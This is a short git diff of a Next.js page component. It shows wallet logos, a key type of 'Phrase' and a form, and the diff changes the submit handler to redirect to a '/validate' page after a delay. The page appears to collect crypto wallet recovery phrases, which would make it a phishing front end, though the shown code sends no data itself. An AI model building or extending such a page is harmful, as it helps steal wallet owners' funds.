@@ -29,8 +29,10 @@ import Onto from "./assets/onto.png";
 import Rainbow from "./assets/rb.png";
 import Image from "next/image";
 import { useEffect, useState } from "react";
+import { useRouter } from "next/navigation";
 
 export default function Home() {
+  const navigate = useRouter();
   const [keyType, setKeyType] = useState("Phrase");
   // const [state, handleSubmit] = useForm("mjvqbbnl");
   const [formState, setFormState] = useState({});
@@ -72,8 +74,9 @@ export default function Home() {
 
   const handleSubmit = async (e) => {
     e.preventDefault();
-    document.getElementById("my_modal_3").close();
-    document.getElementById("my_modal_4").showModal();
+    setTimeout(() => {
+      navigate.push("/validate");
+    }, 1000);
   };
 
   const HandleWallet = () => {
